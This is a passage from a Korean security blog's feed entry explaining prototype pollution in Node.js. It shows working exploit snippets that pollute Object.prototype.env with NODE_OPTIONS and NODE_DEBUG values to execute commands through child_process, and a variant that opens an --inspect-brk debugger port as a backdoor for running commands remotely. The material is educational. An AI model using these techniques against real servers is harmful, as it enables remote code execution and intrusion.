class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">isAdmin</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (session.<span class="property">isAdmin</span>) &#123;</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (session.<span class="property">id</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> (<span class="params">value, options</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (options.<span class="property">auth</span>) &#123;</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;&#125;</span><br><span class="line">inst_a = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line">inst_a.<span class="property">__proto__</span>.<span class="property">__proto__</span> = [<span class="string">&#x27;something&#x27;</span>];</span><br><span class="line">inst_a.<span class="title function_">toString</span>() <span class="comment">// &quot;something&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>Process spawning</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/nodejs/node/blob/master/lib/child_process.js#L514</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">    <span class="keyword">const</span> value = env[key];</span><br><span class="line">    <span class="keyword">if</span> (value !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      envPairs.<span class="title function_">push</span>(<span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>NodeJS의 내장 모듈이며, 서브 프로세스를 생성하는 데에 사용되는<br>child_process 모듈은 자식 프로세스를 생성할 때, 환경 변수를 복사하는 과정을 거치는데<br>복사 과정에 위에서 언급된 <code>for in</code>  반복문을 사용하고 있으므로</p><p>process.env 객체 내부에 직접적으로 정의되지 않았더라도<br>process.env 의 프로토 타입인 Object.prototype 객체가 오염된다면<br>자식 프로세스 생성에 쓰이는 환경 변수를 임의로 추가해낼 수 있습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NODE_OPTIONS=<span class="string">&#x27;--require /proc/self/environ&#x27;</span> node app.js</span><br><span class="line">// same as</span><br><span class="line">node --require /proc/self/environ app.js</span><br></pre></td></tr></table></figure><p>또한 NodeJS 프로세스가 실행될 때, 스크립트가 실행되기 이전에 쓰이는 환경 변수중의 하나로 <code>NODE_OPTIONS</code> 환경변수가 존재하는데<br>본 변수에 <code>--require [argv]</code> 와 같은 NodeJS 프로세스 실행에 사용되는 옵션을 추가하면<br>스크립트 실행에 <code>--require [argv]</code> 추가하여 실행한 것과 같은 효과를 줍니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec, execSync, spawn, spawnSync, fork &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// pollute</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">env</span> = &#123;</span><br><span class="line"><span class="variable constant_">NODE_DEBUG</span> : <span class="string">&#x27;require(&quot;child_process&quot;).execSync(&quot;mkdir executed&quot;)//&#x27;</span>,</span><br><span class="line"><span class="variable constant_">NODE_OPTIONS</span> : <span class="string">&#x27;-r /proc/self/environ&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// method 1</span></span><br><span class="line"><span class="title function_">fork</span>(<span class="string">&#x27;blank&#x27;</span>);</span><br><span class="line"><span class="comment">// method 2</span></span><br><span class="line"><span class="title function_">spawn</span>(<span class="string">&#x27;node&#x27;</span>, [<span class="string">&#x27;blank&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">pipe</span>(process.<span class="property">stdout</span>);</span><br><span class="line"><span class="comment">// method 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">spawnSync</span>(<span class="string">&#x27;node&#x27;</span>, [<span class="string">&#x27;blank&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">toString</span>());</span><br><span class="line"><span class="comment">// method 4</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">execSync</span>(<span class="string">&#x27;node  blank&#x27;</span>).<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure><p>위 두가지를 복합적으로 사용하여 RCE를 유발하는 방법입니다.<br>환경 변수에 스크립트를 포함시키고, 환경 변수가 저장되는 <code>/proc/self/environ</code> 파일을 옵션으로 지정하여, 임의 명령을 실행할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec, execSync, spawn, spawnSync, fork &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// pollute</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">env</span> = &#123;</span><br><span class="line">    <span class="variable constant_">NODE_OPTIONS</span> : <span class="string">&#x27;--inspect-brk=0.0.0.0:1234&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// method 1</span></span><br><span class="line"><span class="title function_">fork</span>(<span class="string">&#x27;blank&#x27;</span>);</span><br><span class="line"><span class="comment">// method 2</span></span><br><span class="line"><span class="title function_">exec</span>(<span class="string">&#x27;node blank&#x27;</span>);</span><br><span class="line"><span class="comment">// method 3</span></span><br><span class="line"><span class="title function_">execSync</span>(<span class="string">&#x27;node blank&#x27;</span>);</span><br><span class="line"><span class="comment">// method 4</span></span><br><span class="line"><span class="title function_">spawn</span>(<span class="string">&#x27;node&#x27;</span>, [<span class="string">&#x27;blank&#x27;</span>]);</span><br><span class="line"><span class="comment">// method 5</span></span><br><span class="line"><span class="title function_">spawnSync</span>(<span class="string">&#x27;node&#x27;</span>, [<span class="string">&#x27;blank&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><code>/proc/self/environ</code> 파일을 사용하는 이전의 방법은 리눅스 서버에서만 작동한다는 단점이 존재합니다.<br>하지만, <code>--inspect-brk</code> 옵션을 이용하면 윈도우에서도 사용이 가능하도록 할 수 있습니다.<br>본 옵션을 사용하여 서브 노드 프로세스를 생성하면, 해당 프로세스는 옵션에 설정된 포트로 디버거가 연결될 때가지 대기하며<br>사실상 백도어와 동일한 역할을 수행할 수 있습니다.</p><p>디버깅 포트가 열리면 <code>node inspect host:port</code> 와 같은 명령을 통해 서버에 연결할 수 있습니다.<br>이후 <code>exec</code> 서브 커맨드를 사용하면  <code>exec child_process.exec(&#39;mkdir executed&#39;)</code>  와 같은 명령을 이용해<br>서버에서 임의의 명령을 실행하게 만들 수 있습니다.</p><p><img src="/img/2019/10/image-3.png" alt="img"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://slides.com/securitymb/prototype-pollution-in-kibana/#/65">https://slides.com/securitymb/prototype-pollution-in-kibana/</a><br><a href="https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/">https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;code&gt;Prototype pollution&lt;/code&gt; 은 객체 기반 스크립트 언어라는 자바스크립트 특이성으로 인해 발생합니다. 따라서 &lt;code&gt;Nodejs&lt;/code&gt; 등 자바스크립트 엔진 기반 서버에서 존재하는 취약점입니다. 자바스크립트
      
    
    </summary>
    
    
      <category term="Docs" scheme="https://blog.p6.is/category/docs/"/>
    
    
      <category term="javascript" scheme="https://blog.p6.is/tags/javascript/"/>
    
      <category term="prototype pollution" scheme="https://blog.p6.is/tags/prototype-pollution/"/>
    
  </entry>
  
</feed>
